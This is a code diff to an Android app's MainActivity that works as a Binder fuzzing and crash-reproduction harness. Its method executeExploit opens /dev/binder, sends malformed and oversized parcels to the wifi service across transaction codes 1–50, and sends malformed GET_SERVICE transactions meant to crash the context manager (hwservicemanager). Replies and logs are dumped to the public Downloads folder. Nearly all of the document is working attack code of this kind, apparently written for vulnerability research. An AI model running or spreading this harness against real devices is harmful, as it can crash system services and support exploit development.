@@ -55,9 +55,10 @@ public class MainActivity extends AppCompatActivity {
 
     public static native int nativeOpenDevice(String path);
     public static native byte[] nativeBinderTransaction(int fd, int handle, int code, int flags, byte[] data);
-    public static native byte[] nativeBinderGetService(int fd, String serviceName);
+    public static native byte[] nativeBinderGetService(int fd, String serviceName, String descriptor);
     public static native String nativeBinderDumpReply(int fd, int handle, int code, int flags, byte[] data);
     public static native int nativeBinderWriteToService(int fd, int handle, int code, int flags, byte[] data);
+    public static native byte[] nativeBuildGetServiceParcel(String descriptor);
 
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
@@ -167,7 +168,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void executeExploit() {
         appendLog("========================================");
-        appendLog("========== BINDER CRASH REPRODUCTION ==========");
+        appendLog("========== BINDER WIFI EXPLORATION ==========");
 
         int fd = nativeOpenDevice("/dev/binder");
         if (fd < 0) {
@@ -179,9 +180,8 @@ public class MainActivity extends AppCompatActivity {
         }
         appendLog("[+] Using fd=" + fd);
 
-        // ---- Step 1: Get wifi service handle ----
-        appendLog("[*] Getting wifi service handle...");
-        byte[] svcReply = nativeBinderGetService(fd, "wifi");
+        appendLog("[*] Getting wifi service handle with correct descriptor format");
+        byte[] svcReply = nativeBinderGetService(fd, "wifi", "android.net.wifi.IWifiManager");
         int wifiHandle = -1;
         if (svcReply != null && svcReply.length >= 4) {
             wifiHandle = ((svcReply[0] & 0xFF) |
@@ -189,26 +189,24 @@ public class MainActivity extends AppCompatActivity {
                           ((svcReply[2] & 0xFF) << 16) |
                           ((svcReply[3] & 0xFF) << 24));
             appendLog("[GETSVC] wifi -> handle=" + wifiHandle + " (0x" + Integer.toHexString(wifiHandle) + ")");
+            dumpToFile(svcReply, "getsvc_wifi.bin");
         } else {
             appendLog("[GETSVC] wifi -> no reply");
         }
 
         if (wifiHandle > 0) {
-            appendLog("[*] WiFi handle obtained, starting crash test on wifi");
-            testWiFiCrash(fd, wifiHandle);
+            appendLog("[*] WiFi handle obtained, testing methods");
+            testWifiMethods(fd, wifiHandle);
         } else {
-            appendLog("[!] WiFi handle not found, skipping wifi crash test");
+            appendLog("[!] WiFi handle not found, trying fallback handles 1-5");
+            for (int h = 1; h <= 5; h++) {
+                appendLog("[*] Testing handle " + h + " as potential wifi service");
+                testWifiMethods(fd, h);
+            }
         }
 
-        // ---- Step 2: Reproduce hwservicemanager crash (context manager) ----
-        appendLog("[*] Reproducing hwservicemanager crash via malformed GET_SERVICE");
-        reproduceContextManagerCrash(fd);
-
-        // ---- Step 3: Try malformed transactions on handle 1-5 (just in case) ----
-        for (int h = 1; h <= 5; h++) {
-            appendLog("[*] Testing malformed transaction on handle " + h);
-            testMalformedTransaction(fd, h);
-        }
+        appendLog("[*] Testing context manager with malformed GET_SERVICE");
+        testContextManagerCrash(fd);
 
         try {
             ParcelFileDescriptor.adoptFd(fd).close();
@@ -223,119 +221,78 @@ public class MainActivity extends AppCompatActivity {
         finishTest();
     }
 
-    // WiFi specific crash tests: send malformed parcels
-    private void testWiFiCrash(int fd, int handle) {
-        appendLog("[WIFI] Testing crash on handle " + handle);
+    private void testWifiMethods(int fd, int handle) {
+        appendLog("[WIFI] Testing handle " + handle);
 
-        // Test patterns: various malformed parcels
-        // Pattern 1: empty data (no parcel)
-        appendLog("[WIFI] Sending empty parcel (data_size=0)");
-        String result = nativeBinderDumpReply(fd, handle, 1, 0, null);
-        appendLog("[WIFI] result: " + result);
+        int[] wifiCodes = {
+            1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
+            11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
+            21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
+            31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
+            41, 42, 43, 44, 45, 46, 47, 48, 49, 50
+        };
 
-        // Pattern 2: parcel with length but no string (length=0)
-        byte[] parcelLen0 = new byte[4];
-        // length field 0
-        result = nativeBinderDumpReply(fd, handle, 1, 0, parcelLen0);
-        appendLog("[WIFI] length=0 -> " + result);
+        for (int code : wifiCodes) {
+            if (stopRequested.get()) break;
+            byte[] data = null;
+            if (code == 1 || code == 2 || code == 3 || code == 4 || code == 5) {
+                data = new byte[4];
+                data[0] = 1;
+            }
+            String result = nativeBinderDumpReply(fd, handle, code, 0, data);
+            appendLog("[WIFI] code=0x" + Integer.toHexString(code) + " -> " + result);
+            try { Thread.sleep(10); } catch (Exception e) {}
+        }
 
-        // Pattern 3: length > 0 but no string (just length field)
-        byte[] parcelLenBig = new byte[4];
-        // put length 100 (but no actual string)
-        parcelLenBig[0] = 100;
-        result = nativeBinderDumpReply(fd, handle, 1, 0, parcelLenBig);
-        appendLog("[WIFI] length=100 (no string) -> " + result);
+        byte[] largeData = new byte[4096];
+        for (int i = 0; i < largeData.length; i++) largeData[i] = (byte)(i & 0xFF);
+        for (int code : new int[]{1, 2, 3, 4, 5, 6, 7, 8, 9, 10}) {
+            if (stopRequested.get()) break;
+            String result = nativeBinderDumpReply(fd, handle, code, 1, largeData);
+            appendLog("[WIFI-ONEWAY] code=0x" + Integer.toHexString(code) + " -> " + result);
+            try { Thread.sleep(10); } catch (Exception e) {}
+        }
 
-        // Pattern 4: correct interface string but with wrong length
-        String correctInterface = "android.net.wifi.IWifiManager";
-        byte[] correctBytes = (correctInterface + "\0").getBytes(StandardCharsets.UTF_8);
-        byte[] wrongLen = new byte[4 + correctBytes.length];
-        // put length = correctBytes.length + 10 (mismatch)
-        int len = correctBytes.length + 10;
-        wrongLen[0] = (byte)(len & 0xFF);
-        wrongLen[1] = (byte)((len >> 8) & 0xFF);
-        wrongLen[2] = (byte)((len >> 16) & 0xFF);
-        wrongLen[3] = (byte)((len >> 24) & 0xFF);
-        System.arraycopy(correctBytes, 0, wrongLen, 4, correctBytes.length);
-        result = nativeBinderDumpReply(fd, handle, 1, 0, wrongLen);
-        appendLog("[WIFI] correct interface with wrong length -> " + result);
-
-        // Pattern 5: wrong interface string (typo)
-        String wrongInterface = "android.net.wifi.IWifiManagerX";
-        byte[] wrongBytes = (wrongInterface + "\0").getBytes(StandardCharsets.UTF_8);
-        byte[] wrongParcel = new byte[4 + wrongBytes.length];
-        int wlen = wrongBytes.length;
-        wrongParcel[0] = (byte)(wlen & 0xFF);
-        wrongParcel[1] = (byte)((wlen >> 8) & 0xFF);
-        wrongParcel[2] = (byte)((wlen >> 16) & 0xFF);
-        wrongParcel[3] = (byte)((wlen >> 24) & 0xFF);
-        System.arraycopy(wrongBytes, 0, wrongParcel, 4, wrongBytes.length);
-        result = nativeBinderDumpReply(fd, handle, 1, 0, wrongParcel);
-        appendLog("[WIFI] wrong interface string -> " + result);
-
-        // Pattern 6: empty string (just null terminator)
-        byte[] emptyStr = new byte[4 + 1];
-        emptyStr[0] = 1;
-        emptyStr[4] = 0; // null terminator
-        result = nativeBinderDumpReply(fd, handle, 1, 0, emptyStr);
-        appendLog("[WIFI] empty string -> " + result);
-
-        // Pattern 7: data with offsets (try to cause parser issues)
-        // We'll send a parcel with an offset that points to invalid data
-        // For simplicity, we send a parcel with offsets_size != 0 but with no valid objects
-        // However our nativeBinderTransaction sets offsets_size=0, we could modify later
-        // but we'll just send a parcel with some data that might be interpreted as object.
-        byte[] objData = new byte[16];
-        // Put a flat_binder_object at offset 0 (not really)
-        // For now, we just send a raw buffer with some data
-        byte[] raw = new byte[64];
-        for (int i = 0; i < raw.length; i++) raw[i] = (byte)i;
-        result = nativeBinderDumpReply(fd, handle, 1, 0, raw);
-        appendLog("[WIFI] raw 64 bytes -> " + result);
+        for (int size : new int[]{16, 32, 64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384}) {
+            byte[] d = new byte[size];
+            for (int i = 0; i < d.length; i++) d[i] = (byte)((i * 7) & 0xFF);
+            String result = nativeBinderDumpReply(fd, handle, 1, 0, d);
+            appendLog("[WIFI-SIZE] " + size + " bytes -> " + result);
+            try { Thread.sleep(10); } catch (Exception e) {}
+        }
     }
 
-    // Reproduce hwservicemanager crash by sending malformed GET_SERVICE
-    private void reproduceContextManagerCrash(int fd) {
-        appendLog("[CRASH-CTX] Sending malformed GET_SERVICE to context manager (handle=0)");
+    private void testContextManagerCrash(int fd) {
+        appendLog("[CRASH-CTX] Sending malformed GET_SERVICE to context manager");
 
-        // Pattern: send empty parcel (no service name) with code=1 (GET_SERVICE)
-        // This caused the crash earlier.
-        appendLog("[CRASH-CTX] empty data");
+        appendLog("[CRASH-CTX] empty data (no parcel)");
         byte[] reply = nativeBinderTransaction(fd, 0, 1, 0, null);
         if (reply == null) {
-            appendLog("[CRASH-CTX] no reply (likely crash occurred)");
+            appendLog("[CRASH-CTX] no reply");
         } else {
             appendLog("[CRASH-CTX] reply len=" + reply.length);
         }
 
-        // Another pattern: send service name without null terminator
-        String svc = "wifi";
-        byte[] svcBytes = svc.getBytes(StandardCharsets.UTF_8);
-        // no null terminator
-        byte[] noNull = new byte[4 + svcBytes.length];
-        int len = svcBytes.length;
-        noNull[0] = (byte)(len & 0xFF);
-        noNull[1] = (byte)((len >> 8) & 0xFF);
-        noNull[2] = (byte)((len >> 16) & 0xFF);
-        noNull[3] = (byte)((len >> 24) & 0xFF);
-        System.arraycopy(svcBytes, 0, noNull, 4, svcBytes.length);
-        appendLog("[CRASH-CTX] sending service name without null terminator");
-        reply = nativeBinderTransaction(fd, 0, 1, 0, noNull);
+        byte[] lenOnly = new byte[4];
+        lenOnly[0] = 100;
+        appendLog("[CRASH-CTX] length=100 with no data");
+        reply = nativeBinderTransaction(fd, 0, 1, 0, lenOnly);
         if (reply == null) {
-            appendLog("[CRASH-CTX] no reply (likely crash)");
+            appendLog("[CRASH-CTX] no reply");
         } else {
             appendLog("[CRASH-CTX] reply len=" + reply.length);
         }
 
-        // Send with wrong length (length > actual bytes)
-        byte[] wrongLenSvc = new byte[4 + svcBytes.length];
-        wrongLenSvc[0] = (byte)(100 & 0xFF);
-        wrongLenSvc[1] = (byte)((100 >> 8) & 0xFF);
-        wrongLenSvc[2] = (byte)((100 >> 16) & 0xFF);
-        wrongLenSvc[3] = (byte)((100 >> 24) & 0xFF);
-        System.arraycopy(svcBytes, 0, wrongLenSvc, 4, svcBytes.length);
-        appendLog("[CRASH-CTX] sending with length=100 (actual shorter)");
-        reply = nativeBinderTransaction(fd, 0, 1, 0, wrongLenSvc);
+        byte[] wrongLen = new byte[4 + 5];
+        wrongLen[0] = 100;
+        wrongLen[1] = 0;
+        wrongLen[2] = 0;
+        wrongLen[3] = 0;
+        String svc = "wifi";
+        System.arraycopy(svc.getBytes(StandardCharsets.UTF_8), 0, wrongLen, 4, svc.length());
+        wrongLen[4 + svc.length()] = 0;
+        appendLog("[CRASH-CTX] length=100 but actual data shorter");
+        reply = nativeBinderTransaction(fd, 0, 1, 0, wrongLen);
         if (reply == null) {
             appendLog("[CRASH-CTX] no reply");
         } else {
@@ -343,26 +300,24 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    // Generic malformed transaction test on arbitrary handle
-    private void testMalformedTransaction(int fd, int handle) {
-        appendLog("[MALFORM] Testing handle " + handle);
-        byte[] empty = null;
-        String res = nativeBinderDumpReply(fd, handle, 1, 0, empty);
-        appendLog("[MALFORM] empty -> " + res);
+    private void dumpToFile(byte[] data, String filename) {
+        File dir = getDumpDir();
+        if (dir == null || data == null) return;
+        File file = new File(dir, filename);
+        try (FileOutputStream fos = new FileOutputStream(file)) {
+            fos.write(data);
+            appendLog("[DUMP] Saved " + data.length + " bytes to " + file.getAbsolutePath());
+        } catch (Exception e) {
+            appendLog("[DUMP] Failed: " + e.getMessage());
+        }
+    }
 
-        byte[] badLen = new byte[4];
-        badLen[0] = 0x01;
-        badLen[1] = 0x00;
-        badLen[2] = 0x00;
-        badLen[3] = 0x00;
-        res = nativeBinderDumpReply(fd, handle, 1, 0, badLen);
-        appendLog("[MALFORM] length=1 with no data -> " + res);
-
-        byte[] justNull = new byte[5];
-        justNull[0] = 1;
-        justNull[4] = 0;
-        res = nativeBinderDumpReply(fd, handle, 1, 0, justNull);
-        appendLog("[MALFORM] null string -> " + res);
+    private File getDumpDir() {
+        if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
+            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+            if (dir != null && (dir.exists() || dir.mkdirs())) return dir;
+        }
+        return getFilesDir();
     }
 
     private void appendLog(final String msg) {
@@ -383,9 +338,9 @@ public class MainActivity extends AppCompatActivity {
     private void saveLog() {
         try {
             File dir = getDumpDir();
-            File file = new File(dir, "binder_crash_test_log.txt");
+            File file = new File(dir, "binder_wifi_test_log.txt");
             try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
-                pw.println("=== Binder Crash Test Log ===");
+                pw.println("=== Binder Wifi Test Log ===");
                 pw.println("Timestamp: " + new Date().toString());
                 pw.println("===================================");
                 pw.print(logBuilder.toString());
@@ -395,14 +350,6 @@ public class MainActivity extends AppCompatActivity {
         } catch (Exception e) {
             appendLog("Save failed: " + e.getMessage());
         }
-    }
-
-    private File getDumpDir() {
-        if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
-            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-            if (dir != null && (dir.exists() || dir.mkdirs())) return dir;
-        }
-        return getFilesDir();
     }
 
     private void finishTest() {
